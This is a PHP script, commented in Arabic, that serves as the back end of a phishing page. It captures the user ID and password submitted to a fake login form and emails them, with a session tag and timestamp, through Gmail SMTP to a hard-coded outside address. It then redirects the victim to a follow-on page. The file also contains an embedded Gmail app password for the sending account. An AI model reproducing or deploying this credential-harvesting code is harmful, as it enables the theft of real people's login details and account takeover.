<?php
session_start();

// توليد معرف جديد في كل مرة يدخل فيها المستخدم الصفحة الأولى
session_regenerate_id(true);  // توليد معرف جديد للجلسة

// توليد معرف فريد جديد عند دخول المستخدم للصفحة الأولى
$_SESSION['user_id'] = bin2hex(random_bytes(4)); // 8 خانات من أرقام وحروف

// تضمين ملفات PHPMailer
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
require 'includes/PHPMailer.php';
require 'includes/SMTP.php';
require 'includes/Exception.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // استقبال البيانات المدخلة من المستخدم
    $userID = isset($_POST['userID']) ? htmlspecialchars(trim($_POST['userID'])) : '';
    $password = isset($_POST['password']) ? htmlspecialchars(trim($_POST['password'])) : '';

    // التحقق من أن الحقول غير فارغة
    if (!empty($userID) && !empty($password)) {
        // إعداد PHPMailer لإرسال البريد
        $mail = new PHPMailer(true);

        try {
            // إعدادات SMTP
            $mail->isSMTP();
            $mail->Host = 'smtp.gmail.com';
            $mail->SMTPAuth = true;
            $mail->Username = 'quzx1913@gmail.com'; // بريد الإرسال
            $mail->Password = 'mdgrsdetuqbnxmne';   // كلمة مرور التطبيق الخاصة ببريد Gmail
            $mail->SMTPSecure = 'tls';
            $mail->Port = 587;

            // إعدادات البريد
            $mail->setFrom('quzx1913@gmail.com', 'X');
            $mail->addAddress('vvqq1913@gmail.com'); // بريد الاستقبال

            // الحصول على التاريخ والوقت الحالي
            $currentDateTime = date("Y-m-d H:i:s");

            // تنسيق HTML لجسم الرسالة
            $mail->isHTML(true);
            $mail->Subject = 'La Casa de Papel';

            $mail->Body = "
            <html>
            <head>
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        background-color: #f4f4f4;
                        margin: 0;
                        padding: 0;
                    }
                    .container {
                        width: 100%;
                        max-width: 600px;
                        margin: 20px auto;
                        padding: 20px;
                        background-color: #fff;
                        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                        border-radius: 8px;
                    }
                    table {
                        width: 100%;
                        border-collapse: collapse;
                    }
                    th, td {
                        padding: 8px 12px;
                        text-align: left;
                    }
                    th {
                        background-color: #4CAF50;
                        color: white;
                    }
                    td {
                        background-color: #f9f9f9;
                    }
                    .footer {
                        text-align: center;
                        margin-top: 20px;
                        font-size: 14px;
                        color: #888;
                    }
                    .footer a {
                        color: #4CAF50;
                        text-decoration: none;
                    }
                </style>
            </head>
            <body>
                <div class='container'>
                    <h2>بيانات تسجيل الدخول</h2>
                    <table>
                        <tr>
                            <th>معرف المستخدم</th>
                            <td>$userID</td>
                        </tr>
                        <tr>
                            <th>كلمة المرور</th>
                            <td>$password</td>
                        </tr>
                        <tr>
                            <th>معرف الجلسة</th>
                            <td>{$_SESSION['user_id']}</td>
                        </tr>
                        <tr>
                            <th>التاريخ والوقت</th>
                            <td>$currentDateTime</td>
                        </tr>
                    </table>
                    <div class='footer'>
                        <p>استغفر الله</p>
                    </div>
                </div>
            </body>
            </html>
            ";

            // إرسال الرسالة
            $mail->send();

            // إعادة التوجيه بعد الإرسال الناجح
            header("Location: ibok.php"); // التوجيه إلى الصفحة الثانية
            exit();
        } catch (Exception $e) {
            echo "❌ خطأ في الإرسال: {$mail->ErrorInfo}";
        }
    } else {
        // في حالة كانت الحقول فارغة
        echo "❌ يرجى ملء جميع الحقول.";
    }
}
?>
